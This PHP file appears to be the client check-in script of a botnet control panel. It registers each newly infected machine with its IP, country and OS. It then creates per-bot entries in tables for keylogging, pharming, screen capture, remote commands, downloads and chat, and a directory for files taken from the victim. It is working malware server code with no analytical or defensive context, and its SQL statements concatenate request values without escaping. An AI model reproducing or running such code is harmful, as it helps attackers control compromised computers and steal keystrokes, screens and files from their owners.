<?php   ///////////////////////  Clinet Check \\\\\\\\\\\\\\\\\\
	$con=mysql_connect($host,$user,$pass);
	mysql_select_db($db,$con);
	$sql="select * from buser where sname='".fud_head($_GET['user'])."'";
	$sel=mysql_query($sql);
	$row=mysql_fetch_array($sel);
		$cononline=mysqli_connect($host,$user,$pass,$db);
		$ip= getip();	
		$datetime=date ("Y-m-d H:i:s");
			if($row['sname']!=NULL)
{
				$name=$row['sname'];
				$order=$row['sorder'];
					$sql="update buser set sonline='".$datetime."', sip='".$ip."' where sname='".$name."'";
			}
				if(isset($_GET['installbot']))
						{
						$ipjson=$ip;
							include("api/lookup.php");
							include("api/clinet-value.php");
								$sql="INSERT INTO buser (`sid`, `sname`, `susername`, `sip`, `slocation`, `sops`, `sinstall`, `sonline`, `sorder`, `sloc`) VALUES (NULL, '".fud_head($_GET['user'])."-".$clinetval."', '".fud_head($_GET['user'])."', '".$ip."', '".$lookup->country."', '".fud_head($_GET['os'])."', '".$datetime."', '".$datetime."', 'NULL', '".$lookup->loc."')";
								echo "<user>".$clinetval."<user>";
								$useraddtb=fud_head($_GET['user'])."-".$clinetval;
									// reate table user \\
									installallmysql( "INSERT INTO bchat (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO bcommand (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO bdownloader (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO bkeylogger (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO bpharming(`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO bscreen (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO bscript (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO bserver (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									installallmysql( "INSERT INTO btask (`sid`, `sname`) VALUES (NULL, '$useraddtb');");
									mkdir("admin/files/clinets/".$useraddtb);
									// reate table user \\
									$clinetval=$clinetval+1;
									$opclinetval=fopen("api/clinet-value.php","w");
										fwrite($opclinetval,"<?php "."$"."clinetval='".$clinetval."';?>");
									fclose($opclinetval);
						}
			mysqli_query($cononline,$sql);
//----------------------------------------------------------
function getip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
	{
        $ip=$_SERVER['HTTP_CLIENT_IP'];
	}
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
	}
    else
	{
        $ip=$_SERVER['REMOTE_ADDR'];
	}
    return $ip;
}
function installallmysql($installuser)
{
	include("config.php");
		$coninstall=mysqli_connect($host,$user,$pass,$db);
			mysqli_query($coninstall,$installuser);
		mysqli_close($coninstall);
}
?>